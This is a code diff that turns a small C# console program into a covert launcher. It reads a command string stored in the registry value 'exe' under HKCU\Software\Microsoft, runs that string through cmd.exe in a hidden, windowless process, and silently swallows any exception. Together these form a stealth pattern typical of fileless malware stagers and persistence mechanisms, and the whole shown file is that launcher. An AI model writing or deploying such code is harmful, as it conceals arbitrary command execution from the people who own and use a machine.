@@ -1,15 +1,16 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using Microsoft.Win32;
+using System;
+using System.Diagnostics;
 
-namespace Execute_CMD
+class Program
 {
-    class Program
+    static void Main(string[] args)
     {
-        static void Main(string[] args)
+        try
         {
+            var exe = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft").GetValue("exe").ToString();
+            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", string.Format("/K {0}", exe)) { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden } }.Start();
         }
+        catch (Exception e) { }
     }
 }
